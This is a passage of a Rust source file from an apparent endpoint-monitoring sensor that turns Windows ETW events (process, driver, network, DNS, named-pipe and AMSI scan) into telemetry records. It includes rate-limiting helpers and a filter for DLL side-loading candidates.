//! ETW record → TRAPD event mapping (platform-neutral, unit-tested anywhere).
//!
//! The Windows ETW sensor (`collectors::windows::etw`) decodes each event with
//! TDH into an [`EtwRecord`]: provider, event id, header PID/time and the named
//! properties. Everything after that — which provider/event means what, how
//! addresses and ports are laid out, how NT device paths become drive paths —
//! lives here, so it is tested without a Windows kernel.
//!
//! Providers (GUIDs verified against the published manifests):
//!
//! | Provider | GUID | Keywords | Events |
//! |---|---|---|---|
//! | Microsoft-Windows-Kernel-Process | `22fb2cd6-0e7b-422b-a0c7-2fad1fd0e716` | `0x10` process, `0x40` image | 1 ProcessStart, 2 ProcessStop, 5 ImageLoad |
//! | Microsoft-Windows-Kernel-Network | `7dd42a49-5329-4832-8dfd-43d979153a88` | `0x10` IPv4, `0x20` IPv6 | 12/28 connect, 15/31 accept |
//! | Microsoft-Windows-DNS-Client | `1c95126e-7eea-49a9-a3fe-a378b03ddb4d` | all | 3008 query completed |
//! | Microsoft-Windows-Kernel-File | `edd08927-9cc4-4e65-b970-c2560fb5c289` | `0x80` create | 12 Create (named pipes only) |
//! | Microsoft-Antimalware-Scan-Interface | `2a576b87-09a7-520e-c21a-4942f0271d67` | all | 1101 scan |
//!
//! Driver loads are Kernel-Process event 5 whose image base lies in kernel
//! space (no extra provider).
//!
//! Property names differ slightly between Windows builds (`ImageName` vs.
//! `ImageFileName`, `ParentProcessID` vs. `ParentId`); every lookup accepts the
//! known aliases.

use std::collections::{HashMap, VecDeque};
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};

use crate::schema::{
    DnsResolutionData, LogEventData, NetworkConnectionData, ProcessCreateData, ProcessTerminateData,
};

pub const KERNEL_PROCESS: u128 = 0x22fb2cd6_0e7b_422b_a0c7_2fad1fd0e716;
pub const KERNEL_NETWORK: u128 = 0x7dd42a49_5329_4832_8dfd_43d979153a88;
pub const DNS_CLIENT: u128 = 0x1c95126e_7eea_49a9_a3fe_a378b03ddb4d;
/// Microsoft-Windows-Kernel-File. The file-actor sensor reads it in its own
/// session; the main session subscribes to creates only, for named pipes.
#[cfg_attr(not(windows), allow(dead_code))]
pub const KERNEL_FILE: u128 = 0xedd08927_9cc4_4e65_b970_c2560fb5c289;
#[cfg_attr(not(windows), allow(dead_code))]
pub const AMSI: u128 = 0x2a576b87_09a7_520e_c21a_4942f0271d67;

#[cfg_attr(not(windows), allow(dead_code))]
pub const KERNEL_PROCESS_KEYWORDS: u64 = 0x10 | 0x40;
#[cfg_attr(not(windows), allow(dead_code))]
pub const KERNEL_NETWORK_KEYWORDS: u64 = 0x10 | 0x20;
/// Kernel-File keywords CREATE (0x80) and WRITE (0x200), from the provider
/// manifest, for the file-actor session. Not field-verified on a Windows host
/// yet: a wrong value only yields no events, never wrong ones.
#[cfg_attr(not(windows), allow(dead_code))]
pub const KERNEL_FILE_KEYWORDS: u64 = 0x80 | 0x200;
/// Kernel-File `CREATE` keyword only, for named pipes on the main session:
/// no reads, writes, deletes or renames.
#[cfg_attr(not(windows), allow(dead_code))]
pub const KERNEL_FILE_PIPE_KEYWORDS: u64 = 0x80;

/// One decoded property value.
#[derive(Debug, Clone, PartialEq)]
pub enum EtwValue {
    Str(String),
    /// Integer value plus its raw little-endian bytes (ports and IPv4
    /// addresses are stored in network byte order and need the raw form).
    Int(u64, Vec<u8>),
    Bytes(Vec<u8>),
}

/// A decoded ETW event.
#[derive(Debug, Clone, Default)]
pub struct EtwRecord {
    pub provider: u128,
    pub id: u16,
    /// `EVENT_HEADER.ProcessId` — the process that *logged* the event.
    pub header_pid: u32,
    /// `EVENT_HEADER.TimeStamp` as FILETIME ticks.
    #[cfg_attr(not(windows), allow(dead_code))]
    pub timestamp: i64,
    pub props: HashMap<String, EtwValue>,
    /// Process context read in the ETW callback itself, the earliest point
    /// user mode sees a `ProcessStart`. Only set for Kernel-Process event 1.
    #[cfg_attr(not(windows), allow(dead_code))]
    pub captured: Option<ProcessEnrichment>,
}

impl EtwRecord {
    fn get(&self, names: &[&str]) -> Option<&EtwValue> {
        names.iter().find_map(|n| self.props.get(*n))
    }
    pub fn str(&self, names: &[&str]) -> Option<String> {
        match self.get(names)? {
            EtwValue::Str(s) => Some(s.clone()),
            _ => None,
        }
    }
    pub fn int(&self, names: &[&str]) -> Option<u64> {
        match self.get(names)? {
            EtwValue::Int(v, _) => Some(*v),
            _ => None,
        }
    }
    fn raw(&self, names: &[&str]) -> Option<Vec<u8>> {
        match self.get(names)? {
            EtwValue::Int(_, raw) | EtwValue::Bytes(raw) => Some(raw.clone()),
            EtwValue::Str(_) => None,
        }
    }
}

/// ETW session uses system-time ticks (FILETIME), never QPC ticks.
#[cfg_attr(not(windows), allow(dead_code))]
pub fn filetime_timestamp(ticks: i64) -> Option<chrono::DateTime<chrono::Utc>> {
    if ticks <= 0 {
        return None;
    }
    let unix_ticks = ticks.checked_sub(116_444_736_000_000_000)?;
    chrono::DateTime::from_timestamp(
        unix_ticks.div_euclid(10_000_000),
        (unix_ticks.rem_euclid(10_000_000) * 100) as u32,
    )
}

/// NT device prefix → drive, e.g. (`\Device\HarddiskVolume3`, `C:`).
pub type DeviceMap = Vec<(String, String)>;

/// `\Device\HarddiskVolume3\Windows\System32\cmd.exe` → `C:\Windows\…`.
/// Paths already in drive form pass through; unknown devices stay as they are
/// (still useful as evidence, and never mistaken for a drive path).
pub fn device_to_dos(path: &str, devices: &DeviceMap) -> String {
    let path = path.strip_prefix("\\??\\").unwrap_or(path);
    for (device, drive) in devices {
        if path.len() > device.len()
            && path
                .get(..device.len())
                .is_some_and(|p| p.eq_ignore_ascii_case(device))
            && path.as_bytes()[device.len()] == b'\\'
        {
            return format!("{drive}{}", &path[device.len()..]);
        }
    }
    path.to_string()
}

fn basename(path: &str) -> String {
    path.rsplit(['\\', '/']).next().unwrap_or(path).to_string()
}

/// What a process start needs from outside the event (looked up while the
/// process is still alive): command line, account and image hash.
#[derive(Debug, Clone, Default)]
pub struct ProcessEnrichment {
    pub exe: Option<String>,
    pub cmdline: Option<String>,
    pub username: Option<String>,
    pub exe_sha256: Option<String>,
    /// Why `exe_sha256` is absent although an image path was known
    /// (oversize / unreadable); recorded in the event's enrichment errors.
    pub exe_sha256_error: Option<crate::telemetry::EnrichmentError>,
}

impl ProcessEnrichment {
    /// Field-wise merge: values already present win, `fallback` fills the
    /// gaps. Empty strings count as missing, so a failed read never masks a
    /// later successful one.
    pub fn prefer_over(self, fallback: ProcessEnrichment) -> ProcessEnrichment {
        fn pick(a: Option<String>, b: Option<String>) -> Option<String> {
            a.filter(|v| !v.is_empty()).or(b.filter(|v| !v.is_empty()))
        }
        let exe_sha256 = pick(self.exe_sha256, fallback.exe_sha256);
        // A failure only matters while no hash was obtained from either side.
        let exe_sha256_error = if exe_sha256.is_some() {
            None
        } else {
            self.exe_sha256_error.or(fallback.exe_sha256_error)
        };
        ProcessEnrichment {
            exe: pick(self.exe, fallback.exe),
            cmdline: pick(self.cmdline, fallback.cmdline),
            username: pick(self.username, fallback.username),
            exe_sha256,
            exe_sha256_error,
        }
    }
}

/// Enrichment is valid only for the generation that produced this source event.
pub fn same_process_generation(start: Option<u64>, current: Option<u64>, observed: i64) -> bool {
    start.is_some_and(|s| s > 0 && current == Some(s) && observed >= 0 && observed as u64 >= s)
}

/// Kernel-Process event 1 → process create.
pub fn process_start(
    rec: &EtwRecord,
    devices: &DeviceMap,
    enrich: ProcessEnrichment,
) -> Option<ProcessCreateData> {
    if rec.provider != KERNEL_PROCESS || rec.id != 1 {
        return None;
    }
    let pid = i32::try_from(rec.int(&["ProcessID", "ProcessId"])?).ok()?;
    let ppid = rec
        .int(&["ParentProcessID", "ParentId", "ParentProcessId"])
        .and_then(|p| i32::try_from(p).ok())
        .unwrap_or(0);
    let image = rec
        .str(&["ImageName", "ImageFileName"])
        .map(|p| device_to_dos(&p, devices))
        .unwrap_or_default();
    let exe = enrich.exe.filter(|e| !e.is_empty()).unwrap_or(image);
    let mut notes = crate::telemetry::Enrichment::new();
    // Source order: the kernel's own payload (authoritative, race-free, when
    // the manifest carries it), then what the callback read at start, then a
    // late lookup. The cap matches the polling collector's contract.
    let from_payload = rec.str(&["CommandLine"]).filter(|c| !c.is_empty());
    let (cmdline, truncation) = crate::telemetry::limits::truncate_str(
        &from_payload.or(enrich.cmdline).unwrap_or_default(),
        crate::telemetry::limits::MAX_CMDLINE_BYTES,
    );
    notes.truncated("cmdline", truncation);
    if cmdline.is_empty() {
        // The process exited before any read could succeed; the start itself
        // is still recorded (Security 4688 can still supply the command line
        // to detection).
        notes.fail("cmdline", crate::telemetry::EnrichmentError::IoError);
    }
    if let Some(cause) = enrich.exe_sha256_error {
        notes.fail("exe_sha256", cause);
    }
    let username = enrich.username.unwrap_or_else(|| "unknown".into());
    if username == "unknown" {
        notes.fail("username", crate::telemetry::EnrichmentError::IoError);
    }
    Some(ProcessCreateData {
        pid,
        ppid,
        name: basename(&exe),
        exe,
        cmdline,
        uid: 0,
        username,
        exe_sha256: enrich.exe_sha256,
        process_start_time: rec.int(&["CreateTime"]).filter(|t| *t > 0),
        parent_start_time: None,
        parent_exe: None,
        enrichment: notes.finish(0),
    })
}

/// Kernel-Process event 2 → process terminate.
pub fn process_stop(rec: &EtwRecord, devices: &DeviceMap) -> Option<ProcessTerminateData> {
    if rec.provider != KERNEL_PROCESS || rec.id != 2 {
        return None;
    }
    let pid = i32::try_from(rec.int(&["ProcessID", "ProcessId"])?).ok()?;
    let name = rec
        .str(&["ImageName", "ImageFileName"])
        .map(|p| basename(&device_to_dos(&p, devices)))
        .unwrap_or_default();
    Some(ProcessTerminateData { pid, name })
}

/// Kernel-Process event 5 → (pid, loaded image path).
pub fn image_load(rec: &EtwRecord, devices: &DeviceMap) -> Option<(i32, String)> {
    if rec.provider != KERNEL_PROCESS || rec.id != 5 {
        return None;
    }
    let pid = i32::try_from(rec.int(&["ProcessID", "ProcessId"])?).ok()?;
    let image = rec.str(&["ImageName", "FileName"])?;
    Some((pid, device_to_dos(&image, devices)))
}

/// First address of kernel space on x64 Windows (canonical upper half).
const KERNEL_SPACE_START: u64 = 0xFFFF_8000_0000_0000;

/// A kernel-mode image load (a driver, or the kernel itself).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DriverLoad {
    pub path: String,
    pub name: String,
    pub image_size: Option<u64>,
}

/// `\SystemRoot\...` (the loader's own alias) → `<system_root>\...`.
fn resolve_system_root(path: &str, system_root: &str) -> String {
    const PREFIX: &str = "\\SystemRoot\\";
    match path.get(..PREFIX.len()) {
        Some(p) if p.eq_ignore_ascii_case(PREFIX) && !system_root.is_empty() => format!(
            "{}\\{}",
            system_root.trim_end_matches('\\'),
            &path[PREFIX.len()..]
        ),
        _ => path.to_string(),
    }
}

/// Kernel-Process event 5 for a kernel-mode image → driver load.
///
/// The image base decides: user-mode DLLs and EXEs never map into kernel
/// space, so `ImageBase >= 0xFFFF800000000000` is definitive and independent of
/// which pseudo-PID the provider reports (4 / 0). Without an `ImageBase`
/// property the PID 4 + `.sys` shape is accepted as a weaker fallback.
pub fn driver_load(rec: &EtwRecord, devices: &DeviceMap, system_root: &str) -> Option<DriverLoad> {
    if rec.provider != KERNEL_PROCESS || rec.id != 5 {
        return None;
    }
    let raw = rec.str(&["ImageName", "FileName"])?;
    let in_kernel = match rec.int(&["ImageBase"]) {
        Some(base) => base >= KERNEL_SPACE_START,
        None => {
            rec.int(&["ProcessID", "ProcessId"]) == Some(4)
                && raw.to_ascii_lowercase().ends_with(".sys")
        }
    };
    if !in_kernel {
        return None;
    }
    let path = resolve_system_root(&device_to_dos(&raw, devices), system_root);
    if path.is_empty() {
        return None;
    }
    Some(DriverLoad {
        name: basename(&path),
        path,
        image_size: rec.int(&["ImageSize"]).filter(|s| *s > 0),
    })
}

/// Token bucket with an injected clock (milliseconds), so tests are
/// deterministic. Every refusal must be counted by the caller as
/// `DropReason::RateLimitApplied`; the gate never discards silently itself.
#[cfg_attr(not(windows), allow(dead_code))]
#[derive(Debug, Clone)]
pub struct RateGate {
    per_sec: f64,
    burst: f64,
    tokens: f64,
    last_ms: u64,
}

#[cfg_attr(not(windows), allow(dead_code))]
impl RateGate {
    pub fn new(per_sec: u32, burst: u32) -> Self {
        Self {
            per_sec: f64::from(per_sec),
            burst: f64::from(burst.max(1)),
            tokens: f64::from(burst.max(1)),
            last_ms: 0,
        }
    }

    pub fn allow(&mut self, now_ms: u64) -> bool {
        let dt = now_ms.saturating_sub(self.last_ms) as f64 / 1000.0;
        self.last_ms = self.last_ms.max(now_ms);
        self.tokens = (self.tokens + dt * self.per_sec).min(self.burst);
        if self.tokens >= 1.0 {
            self.tokens -= 1.0;
            true
        } else {
            false
        }
    }
}

/// Does a raw Kernel-File event payload mention `\NamedPipe\` (UTF-16LE,
/// ASCII case-insensitive)? A cheap, layout-independent prefilter run in the ETW
/// callback so the far more frequent ordinary file creates never reach TDH
/// decoding or the channel.
#[cfg_attr(not(windows), allow(dead_code))]
pub fn payload_mentions_pipe(user_data: &[u8]) -> bool {
    const NEEDLE: &[u8] = b"\\NamedPipe\\";
    let n = NEEDLE.len();
    if user_data.len() < n * 2 {
        return false;
    }
    (0..=user_data.len() - n * 2).any(|start| {
        NEEDLE.iter().enumerate().all(|(i, b)| {
            user_data[start + 2 * i].eq_ignore_ascii_case(b) && user_data[start + 2 * i + 1] == 0
        })
    })
}

/// Longest pipe name kept (Windows limits a pipe name to 256 characters).
const MAX_PIPE_NAME_CHARS: usize = 256;

/// Kernel-File event 12 (Create) on `\Device\NamedPipe\<name>` → (logging PID,
/// `\\.\pipe\<name>`). Creation of a server instance and a client connect both
/// appear here and cannot be told apart from this event; the root directory
/// open (no name) is not a pipe and is refused.
#[cfg_attr(not(windows), allow(dead_code))]
pub fn pipe_create(rec: &EtwRecord) -> Option<(u32, String)> {
    if rec.provider != KERNEL_FILE || rec.id != 12 {
        return None;
    }
    const PREFIX: &str = "\\Device\\NamedPipe\\";
    let file = rec.str(&["FileName"])?;
    let head = file.get(..PREFIX.len())?;
    if !head.eq_ignore_ascii_case(PREFIX) {
        return None;
    }
    let name: String = file[PREFIX.len()..]
        .chars()
        .take(MAX_PIPE_NAME_CHARS)
        .collect();
    if name.is_empty() {
        return None;
    }
    Some((rec.header_pid, format!("\\\\.\\pipe\\{name}")))
}

/// Remembers keys seen within a time window so identical repeats (a client
/// reopening one pipe, the same script scanned again) are reported once.
/// Bounded: it is cleared when full. Callers count a suppressed repeat as
/// `rate_limit_applied`.
#[cfg_attr(not(windows), allow(dead_code))]
#[derive(Debug)]
pub struct RecentSet<K: std::hash::Hash + Eq> {
    seen: HashMap<K, u64>,
    window_ms: u64,
    cap: usize,
}

#[cfg_attr(not(windows), allow(dead_code))]
impl<K: std::hash::Hash + Eq> RecentSet<K> {
    pub fn new(window_ms: u64, cap: usize) -> Self {
        Self {
            seen: HashMap::new(),
            window_ms,
            cap,
        }
    }

    /// `true` when `key` was not seen within the window (and records it).
    pub fn first_seen(&mut self, key: K, now_ms: u64) -> bool {
        if let Some(last) = self.seen.get(&key) {
            if now_ms.saturating_sub(*last) < self.window_ms {
                return false;
            }
        }
        if self.seen.len() >= self.cap && !self.seen.contains_key(&key) {
            self.seen.clear();
        }
        self.seen.insert(key, now_ms);
        true
    }
}

/// Sheds the noisiest optional provider when the shared session starts losing
/// events: process and network telemetry share its buffers, and an optional
/// stream must not cost them. Trips once; the owner then disables the
/// provider and reports it in coverage.
#[cfg_attr(not(windows), allow(dead_code))]
#[derive(Debug)]
pub struct LossGuard {
    baseline: u64,
    max_lost: u64,
    tripped: bool,
}

#[cfg_attr(not(windows), allow(dead_code))]
impl LossGuard {
    pub fn new(baseline_lost: u64, max_lost: u64) -> Self {
        Self {
            baseline: baseline_lost,
            max_lost,
            tripped: false,
        }
    }

    /// `true` exactly once: when losses since creation first exceed the limit.
    pub fn observe(&mut self, total_lost: u64) -> bool {
        if self.tripped || total_lost.saturating_sub(self.baseline) <= self.max_lost {
            return false;
        }
        self.tripped = true;
        true
    }
}

/// Most decoded script text kept per AMSI scan.
pub const AMSI_MAX_CONTENT_BYTES: usize = 32 * 1024;
/// AMSI scan results from here up are an antimalware verdict (admin block
/// range `0x4000..=0x4fff`, detected `>= 0x8000`).
const AMSI_RESULT_FLAGGED_MIN: u32 = 0x4000;

fn amsi_verdict(result: u32) -> &'static str {
    match result {
        0 => "clean",
        1..=0x3fff => "not_detected",
        0x4000..=0x7fff => "blocked_by_admin",
        _ => "detected",
    }
}

/// AMSI content bytes → text, or `None` when they are not script text
/// (a .NET assembly, a binary blob). PowerShell and the script hosts hand over
/// UTF-16LE; anything else is read as UTF-8. Nothing binary is shipped.
pub fn decode_amsi_text(bytes: &[u8]) -> Option<String> {
    if bytes.is_empty() || bytes.starts_with(b"MZ") {
        return None;
    }
    let odd_zero = bytes.iter().skip(1).step_by(2).filter(|b| **b == 0).count();
    let utf16 =
        bytes.len() >= 2 && bytes.len().is_multiple_of(2) && odd_zero * 2 >= bytes.len() / 2;
    let text = if utf16 {
        let mut units = Vec::with_capacity(bytes.len() / 2);
        let mut i = 0;
        while i + 1 < bytes.len() {
            units.push(u16::from_le_bytes([bytes[i], bytes[i + 1]]));
            i += 2;
        }
        String::from_utf16_lossy(&units)
    } else {
        String::from_utf8_lossy(bytes).into_owned()
    };
    let text = text.trim_start_matches('\u{feff}').trim_end_matches('\0');
    let total = text.chars().count();
    let junk = text
        .chars()
        .filter(|c| *c == '\u{fffd}' || (c.is_control() && !matches!(c, '\t' | '\n' | '\r')))
        .count();
    (total > 0 && junk * 10 <= total).then(|| text.to_string())
}

/// One AMSI scan, ready to ship as a log event.
#[derive(Debug, Clone)]
pub struct AmsiScan {
    /// `sha256:<hex>` of the scanned bytes, when they were read.
    pub content_sha256: Option<String>,
    pub data: LogEventData,
}

/// Microsoft-Antimalware-Scan-Interface event 1101 → log record.
///
/// Script text can hold credentials, so `capture` is the operator's
/// `script_block_capture_enabled` opt-in. Without it no content is decoded
/// (the ETW layer does not even read the property) and only scans that
/// received an antimalware verdict are reported, as metadata without text.
/// With it, text is kept up to [`AMSI_MAX_CONTENT_BYTES`] with explicit
/// `content_truncated` / `content_omitted` markers.
pub fn amsi_scan(rec: &EtwRecord, capture: bool) -> Option<AmsiScan> {
    use sha2::{Digest, Sha256};
    if rec.provider != AMSI || rec.id != 1101 {
        return None;
    }
    let scan_result = rec
        .int(&["scanResult", "ScanResult"])
        .and_then(|r| u32::try_from(r).ok())
        .unwrap_or(0);
    let flagged = scan_result >= AMSI_RESULT_FLAGGED_MIN;
    let content_size = rec.int(&["contentsize", "ContentSize"]).unwrap_or(0);
    if !flagged && (!capture || content_size == 0) {
        return None;
    }
    let app_name = rec
        .str(&["appname", "AppName"])
        .unwrap_or_default()
        .chars()
        .take(512)
        .collect::<String>();
    let content_name = rec
        .str(&["contentname", "ContentName"])
        .unwrap_or_default()
        .chars()
        .take(1024)
        .collect::<String>();
    let bytes = if capture {
        rec.raw(&["content", "Content"])
    } else {
        None
    };
    let content_sha256 = bytes
        .as_ref()
        .map(|b| format!("sha256:{}", hex::encode(Sha256::digest(b))));
    let verdict = amsi_verdict(scan_result);
    let mut text = String::new();
    let mut truncation = None;
    let mut omitted = None;
    match (capture, bytes.as_deref()) {
        (false, _) => omitted = Some("capture_disabled"),
        (true, Some(b)) => match decode_amsi_text(b) {
            Some(t) => {
                let (kept, tr) = crate::telemetry::limits::truncate_str(&t, AMSI_MAX_CONTENT_BYTES);
                text = kept;
                truncation = tr;
            }
            None => omitted = Some("binary"),
        },
        // The property reader refuses values above its size cap.
        (true, None) => {
            omitted = Some(if content_size > 64 * 1024 {
                "oversize"
            } else {
                "unavailable"
            })
        }
    }
    let mut fields = serde_json::Map::new();
    fields.insert("EventID".into(), 1101.into());
    fields.insert("app_name".into(), app_name.clone().into());
    fields.insert("content_name".into(), content_name.into());
    fields.insert("scan_result".into(), scan_result.into());
    fields.insert("scan_verdict".into(), verdict.into());
    if let Some(status) = rec.int(&["scanStatus", "ScanStatus"]) {
        fields.insert("scan_status".into(), status.into());
    }
    fields.insert("content_size".into(), content_size.into());
    if let Some(orig) = rec.int(&["originalsize", "OriginalSize"]) {
        fields.insert("original_size".into(), orig.into());
    }
    if let Some(h) = &content_sha256 {
        fields.insert("content_sha256".into(), h.clone().into());
    }
    fields.insert("content_captured".into(), (!text.is_empty()).into());
    if let Some(reason) = omitted {
        fields.insert("content_omitted".into(), reason.into());
    }
    fields.insert("content_truncated".into(), truncation.is_some().into());
    let message = if text.is_empty() {
        format!("AMSI scan {verdict}: {app_name}")
    } else {
        text
    };
    Some(AmsiScan {
        content_sha256,
        data: LogEventData {
            source: "amsi".into(),
            source_type: "windows_etw".into(),
            source_path: "Microsoft-Antimalware-Scan-Interface".into(),
            parser: "etw_amsi".into(),
            message,
            category: "application".into(),
            log_timestamp: None,
            facility: None,
            log_severity: Some(if flagged { "warning" } else { "info" }.into()),
            proc: Some(app_name).filter(|a| !a.is_empty()),
            pid: i32::try_from(rec.header_pid).ok().filter(|p| *p > 0),
            uid: None,
            username: None,
            log_host: None,
            fields,
            mitre_tactic: None,
            mitre_technique: None,
            offset: None,
            inode: None,
            truncated_fields: truncation.map(|t| [("message".to_string(), t)].into()),
        },
    })
}

/// A DLL load worth reporting: a process that runs from a protected location
/// loaded a `.dll` from a folder an unprivileged user can write to (the DLL
/// search-order hijack / side-loading shape). This is a volume filter, not a
/// verdict: every DLL load is far too frequent to ship, and judging the
/// candidate happens in the backend. Per-user sync clients legitimately load
/// shell extensions from their own AppData folders and are left out.
pub fn is_side_load_candidate(process_exe: &str, dll: &str) -> bool {
    let dll_l = dll.to_ascii_lowercase().replace('/', "\\");
    if !dll_l.ends_with(".dll") {
        return false;
    }
    let exe_l = process_exe.to_ascii_lowercase().replace('/', "\\");
    let trusted_process = exe_l.contains(":\\windows\\system32\\")
        || exe_l.contains(":\\windows\\syswow64\\")
        || exe_l.contains(":\\program files\\")
        || exe_l.contains(":\\program files (x86)\\");
    let writable = dll_l.contains("\\appdata\\")
        || dll_l.contains("\\users\\public\\")
        || dll_l.contains("\\windows\\temp\\")
        || dll_l.contains("\\temp\\")
        || dll_l.contains("\\downloads\\")
        || dll_l.contains("\\desktop\\")
        || (dll_l.contains(":\\programdata\\") && !dll_l.contains("\\programdata\\microsoft\\"))
        || dll_l.contains("\\$recycle.bin\\");
    const PER_USER_CLIENTS: &[&str] = &[
        "\\appdata\\local\\microsoft\\onedrive\\",
        "\\appdata\\local\\microsoft\\teams\\",
        "\\appdata\\local\\microsoft\\windowsapps\\",
        "\\appdata\\local\\packages\\",
    ];
    trusted_process && writable && !PER_USER_CLIENTS.iter().any(|k| dll_l.contains(k))
}

/// Address property → text. IPv4 arrives as a 4-byte integer in network
/// order, IPv6 as 16 raw bytes.
fn address(rec: &EtwRecord, name: &str) -> Option<String> {
    let raw = rec.raw(&[name])?;
    match raw.len() {
        4 => Some(Ipv4Addr::new(raw[0], raw[1], raw[2], raw[3]).to_string()),
        16 => {
            let mut b = [0u8; 16];
            b.copy_from_slice(&raw);
            Some(Ipv6Addr::from(b).to_string())
        }
        _ => None,
    }
}

/// Port property → host order (stored big-endian on the wire).
fn port(rec: &EtwRecord, name: &str) -> Option<u16> {
    let raw = rec.raw(&[name])?;
    (raw.len() == 2).then(|| u16::from_be_bytes([raw[0], raw[1]]))
}

/// Kernel-Network connect/accept → connection record.
pub fn network_connection(
    rec: &EtwRecord,
    process: Option<String>,
) -> Option<NetworkConnectionData> {
    if rec.provider != KERNEL_NETWORK {
        return None;
    }
    let inbound = match rec.id {
        12 | 28 => false,
        15 | 31 => true,
        _ => return None,
    };
    let pid = rec.int(&["PID"]).and_then(|p| i32::try_from(p).ok());
    let daddr = address(rec, "daddr")?;
    let saddr = address(rec, "saddr")?;
    let dport = port(rec, "dport")?;
    let sport = port(rec, "sport")?;
    let v6 = daddr.contains(':');
    // The provider reports both directions from the local socket's view:
    // `saddr`/`sport` are local for a connect, remote for an accept.
    let (src_addr, src_port, dst_addr, dst_port) = if inbound {
        (daddr, dport, saddr, sport)
    } else {
        (saddr, sport, daddr, dport)
    };
    Some(NetworkConnectionData {
        protocol: if v6 { "tcp6" } else { "tcp" }.into(),
        src_addr,
        src_port,
        dst_addr,
        dst_port,
        state: if inbound { "accepted" } else { "established" }.into(),
        pid,
        process_start_time: None,
        process,
        duration_ms: None,
        bytes_sent: None,
        bytes_recv: None,
        packets_sent: None,
        packets_recv: None,
        rtt_us: None,
    })
}

fn qtype_name(t: u64) -> String {
    match t {
        1 => "A".into(),
        2 => "NS".into(),
        5 => "CNAME".into(),
        6 => "SOA".into(),
        12 => "PTR".into(),
        15 => "MX".into(),
        16 => "TXT".into(),
        28 => "AAAA".into(),
        33 => "SRV".into(),
        65 => "HTTPS".into(),
        255 => "ANY".into(),
        other => format!("TYPE{other}"),
    }
}

/// `QueryStatus` (Win32/DNS error code) → DNS response code text.
///
/// DNS RCODEs surface as `DNS_ERROR_RCODE_*` (9001..9010, windns.h). Statuses
/// that are not a DNS response code (transport errors, `ERROR_INVALID_PARAMETER`
/// = 87, ...) map to `UNKNOWN` rather than leaking a Win32 number into a field
/// whose contract is an RCODE name.
fn rcode(status: u64) -> &'static str {
    match status {
        0 => "NOERROR",
        9001 => "FORMERR",
        9002 => "SERVFAIL",
        9003 => "NXDOMAIN",
        9004 => "NOTIMP",
        9005 => "REFUSED",
        9006 => "YXDOMAIN",
        9007 => "YXRRSET",
        9008 => "NXRRSET",
        9009 => "NOTAUTH",
        9010 => "NOTZONE",
        // DNS_INFO_NO_RECORDS / DNS_ERROR_RECORD_DOES_NOT_EXIST: the name
        // resolved but holds no record of the requested type (NODATA).
        9501 | 9701 => "NODATA",
        // ERROR_TIMEOUT / DNS timeout / WSAETIMEDOUT.
        258 | 1460 | 10060 => "TIMEOUT",
        _ => "UNKNOWN",
    }
}

/// Parses the `QueryResults` text of DNS-Client events, e.g.
/// `"10.0.0.5;::ffff:10.0.0.5;type:  5 cdn.example;type:  6 ns1.example admin.example 1 900 ...;"`.
///
/// Only address entries and CNAME (type 5) entries belong to the answer.
/// Other `type:` entries (SOA 6, NS 2, ...) are authority records of a
/// negative response and must not be reported as aliases.
fn parse_query_results(text: &str) -> (Vec<String>, Vec<String>) {
    let (mut ips, mut cnames) = (Vec::new(), Vec::new());
    for part in text.split(';') {
        let part = part.trim();
        if part.is_empty() {
            continue;
        }
        if let Some(rest) = part.strip_prefix("type:") {
            let mut fields = rest.split_whitespace();
            if fields.next() == Some("5") {
                if let Some(name) = fields.next() {
                    cnames.push(name.trim_end_matches('.').to_string());
                }
            }
        } else if part.parse::<std::net::IpAddr>().is_ok() {
            let ip = part.strip_prefix("::ffff:").unwrap_or(part).to_string();
            if !ips.contains(&ip) {
                ips.push(ip);
            }
        }
    }
    (ips, cnames)
}

/// DNS-Client event 3008 (query completed) → resolution record. Returns the
/// PID that logged the event alongside; the DNS-Client library runs in the
/// querying process, so this is the requester unless it is the Dnscache
/// service host (shared-cache lookups).
pub fn dns_query(rec: &EtwRecord) -> Option<(u32, DnsResolutionData)> {
    if rec.provider != DNS_CLIENT || rec.id != 3008 {
        return None;
    }
    let qname = rec.str(&["QueryName"])?.trim_end_matches('.').to_string();
    if qname.is_empty() {
        return None;
    }
    let qtype = qtype_name(rec.int(&["QueryType"]).unwrap_or(0));
    let status = rec.int(&["QueryStatus", "Status"]).unwrap_or(0);
    let (ips, cnames) = parse_query_results(&rec.str(&["QueryResults"]).unwrap_or_default());
    Some((
        rec.header_pid,
        DnsResolutionData {
            qname,
            qtype,
            resolved_ips: ips,
            cnames,
            // The provider delivers neither client address nor transaction id;
            // the server comes from `dns_server_hint`, never from here.
            server_addr: String::new(),
            client_addr: String::new(),
            transaction_id: 0,
            rcode: rcode(status).to_string(),
            query_status: u32::try_from(status).ok(),
            pid: None,
            process: None,
            process_start_time: None,
        },
    ))
}

/// DNS-Client events that name the server a query was sent to (3009 network
/// query initiated, 3010 query sent, 3011 response received) →
/// `(lower-case query name, query type, server address)`. Only a value that
/// parses as an IP address is accepted.
pub fn dns_server_hint(rec: &EtwRecord) -> Option<(String, u64, String)> {
    if rec.provider != DNS_CLIENT || !matches!(rec.id, 3009..=3011) {
        return None;
    }
    let qname = rec
        .str(&["QueryName"])?
        .trim_end_matches('.')
        .to_ascii_lowercase();
    if qname.is_empty() {
        return None;
    }
    let server = rec.str(&["DnsServerIpAddress", "DnsServerAddress"])?;
    let server = server.trim().trim_matches(|c| c == '[' || c == ']');
    let ip: IpAddr = server.parse().ok()?;
    Some((qname, rec.int(&["QueryType"]).unwrap_or(0), ip.to_string()))
}

/// How long a server hint may precede the completion event it belongs to.
const DNS_HINT_TTL_TICKS: i64 = 30 * 10_000_000;
const DNS_HINT_MAX: usize = 1024;

/// Bounded `(name, type)` → server memory joining the "query sent" events to
/// the completion event. A hint only decorates an event that is emitted
/// anyway, so overflowing it loses a field, not an event.
#[derive(Default)]
pub struct DnsServerHints {
    map: HashMap<(String, u64), (String, i64)>,
    order: VecDeque<(String, u64)>,
}

impl DnsServerHints {
    pub fn note(&mut self, rec: &EtwRecord) {
        let Some((name, qtype, server)) = dns_server_hint(rec) else {
            return;
        };
        let key = (name, qtype);
        if self
            .map
            .insert(key.clone(), (server, rec.timestamp))
            .is_none()
        {
            self.order.push_back(key);
        }
        while self.map.len() > DNS_HINT_MAX {
            match self.order.pop_front() {
                Some(old) => {
                    self.map.remove(&old);
                }
                None => break,
            }
        }
    }

    /// Server for a completion event, when one was seen shortly before it.
    pub fn take(&mut self, qname: &str, qtype: u64, completed: i64) -> Option<String> {
        let (server, at) = self.map.remove(&(qname.to_ascii_lowercase(), qtype))?;
